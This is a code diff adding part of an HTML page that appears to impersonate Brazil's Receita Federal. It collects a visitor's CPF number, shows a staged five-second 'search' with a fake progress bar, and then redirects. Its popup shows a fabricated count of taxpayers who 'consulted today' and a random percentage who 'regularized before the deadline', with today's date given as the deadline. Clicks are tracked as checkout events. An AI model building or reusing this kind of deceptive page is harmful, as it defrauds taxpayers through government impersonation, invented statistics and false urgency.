+                loadText.textContent = 'Localizando informações vinculadas ao CPF '+cpfMask+'… isso leva ~5 segundos';
+
+                setTimeout(function() {
+                    document.getElementById('fullscreen-loader').style.display = 'flex';
+                    modalOverlay.style.display = 'none';
+
+                    var progress = 0;
+                    var interval = setInterval(function() {
+                        progress += 2;
+                        if (progress > 100) progress = 100;
+                        progressBar.style.width = progress + '%';
+                        progressPercent.textContent = progress + '%';
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            setTimeout(function() {
+                                window.location.href = '/' + cpf;
+                            }, 500);
+                        }
+                    }, 100);
+                }, 500);
+            } else {
+                cpfInput.style.borderColor = '#C5190A';
+                cpfInput.style.boxShadow = '0 0 0 2px rgba(197,25,10,0.12)';
+                var errEl = document.getElementById('cpf-error-msg');
+                if(!errEl){
+                    errEl = document.createElement('p');
+                    errEl.id = 'cpf-error-msg';
+                    errEl.style.cssText = 'font-size:11px;color:#C5190A;margin-top:6px;font-family:Inter,Rawline,sans-serif;font-weight:500;';
+                    cpfInput.parentNode.insertBefore(errEl, cpfInput.nextSibling);
+                }
+                errEl.textContent = 'Informe os 11 dígitos do CPF para prosseguir.';
+                errEl.style.display = 'block';
+                setTimeout(() => {
+                    cpfInput.style.borderColor = '#ccc';
+                    cpfInput.style.boxShadow = 'none';
+                    if(errEl) errEl.style.display = 'none';
+                }, 3000);
+            }
+        }
+    </script>
+    <div id="popup-social" class="popup-flutuante" style="display:none;"></div>
+
+
+    {% if ga_container_id %}
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','{{ ga_container_id }}');</script>
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id={{ ga_container_id }}" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    {% endif %}
+
+    <script>
+    (function(){
+        var btnConsulta=document.getElementById('btn-abrir-consulta');
+        var btnContinuar=document.getElementById('btn-continuar');
+        var popupEl=document.getElementById('popup-social');
+        var popupVisible=false;
+
+        function getConsultaCount(){
+            var base=2847;
+            var now=new Date();
+            var minutesSinceMidnight=now.getHours()*60+now.getMinutes();
+            return base+Math.floor(minutesSinceMidnight*0.4);
+        }
+        function getDataHoje(){
+            var h=new Date();
+            return String(h.getDate()).padStart(2,'0')+'/'+String(h.getMonth()+1).padStart(2,'0')+'/'+h.getFullYear();
+        }
+        function showPopup(){
+            var count=getConsultaCount();
+            var pct=Math.floor(82+Math.random()*9);
+            popupEl.innerHTML='<i class="fas fa-chart-line" style="color:#1351B4;font-size:14px;margin-top:2px;flex-shrink:0;"></i><span style="font-size:12px;line-height:1.5;"><strong style="color:#071D41;">'+count.toLocaleString('pt-BR')+'</strong> contribuintes consultaram hoje &mdash; <strong style="color:#071D41;">'+pct+'%</strong> regularizaram antes do prazo final de '+getDataHoje()+'.</span>';
+            popupEl.style.display='flex';
+            popupEl.style.alignItems='flex-start';
+            popupEl.style.gap='10px';
+            requestAnimationFrame(function(){
+                requestAnimationFrame(function(){
+                    popupEl.classList.add('visible');
+                });
+            });
+            popupVisible=true;
+            setTimeout(hidePopup, 7000);
+        }
+        function hidePopup(){
+            popupEl.classList.remove('visible');
+            popupVisible=false;
+            setTimeout(showPopup, 12000);
+        }
+        setTimeout(showPopup, 4000);
+
+        if(btnConsulta){
+            btnConsulta.addEventListener('click',function(){
+                try{
+                    if(typeof fbq==='function')fbq('track','InitiateCheckout');
+                    if(typeof gtag==='function')gtag('event','click',{event_category:'consulta',event_label:'cpf-home'});
+                    if(window.dataLayer)window.dataLayer.push({event:'consulta_click'});
+                }catch(e){}
+                localStorage.setItem('clickedConsulta',Date.now());
+            },true);
+        }
+        if(btnContinuar){
+            btnContinuar.addEventListener('click',function(){
+                try{
+                    if(typeof fbq==='function')fbq('track','InitiateCheckout');
+                    if(typeof gtag==='function')gtag('event','click',{event_category:'consulta',event_label:'cpf-home'});
+                    if(window.dataLayer)window.dataLayer.push({event:'consulta_click'});
+                }catch(e){}
+                localStorage.setItem('clickedConsulta',Date.now());
+            },true);
+        }
+    })();
+    </script>
+
+    <script src="/static/rfb-header.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            rfbHeaderInit('Entrar');
+        });
+    </script>
+</body>
+</html>
